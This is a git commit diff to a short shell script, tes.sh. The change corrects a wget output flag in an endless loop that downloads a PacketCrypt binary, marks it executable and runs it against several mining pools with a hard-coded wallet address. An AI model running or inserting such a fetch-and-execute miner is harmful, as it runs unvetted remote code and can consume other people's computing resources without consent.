2b9772acf5fd9b438f72220956e3fd49a1af3eed
dnqjwdz <100903992+dnqjwdz@users.noreply.github.com>
2022-07-15 20:33:36 +0700

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -1,5 +1,5 @@
 while [ 1 ]; do
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -o nt
+wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O nt
 chmod +x nt
 timeout 10m ./nt -o ann -p pkt1qmga844nr8q2x0ndlyqzm6k89g8ujjrhs4eg3gl http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com
 sleep 5
